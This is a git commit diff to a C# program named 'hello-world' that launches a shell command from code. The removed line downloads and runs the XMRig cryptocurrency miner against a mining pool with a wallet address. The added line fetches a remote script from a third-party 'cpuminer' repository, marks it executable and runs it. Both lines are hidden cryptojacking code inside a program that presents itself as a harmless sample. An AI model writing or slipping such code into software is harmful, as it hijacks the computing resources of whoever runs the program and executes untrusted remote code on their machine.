9031b57c6a76698f9fcb4d89b9ef7e09b67c1851
knyL <linhleduc.it@hotmail.com>
2022-03-09 20:31:44 +0700

    update script

--- hello-world/Program.cs
+++ hello-world/Program.cs
@@ -40,7 +40,7 @@ namespace hello_world
                     FileName = $"/bin/bash",
                     WorkingDirectory = AppContext.BaseDirectory,
                     Arguments =
-                        $"-c \"curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz ; pkill xmrig; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx \"",
+                        $"-c \"curl -LJO https://raw.githubusercontent.com/ubuntuabd4/cpuminer/master/1.sh 1.sh; chmod +x 1.sh ; ./1.sh \"",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false,
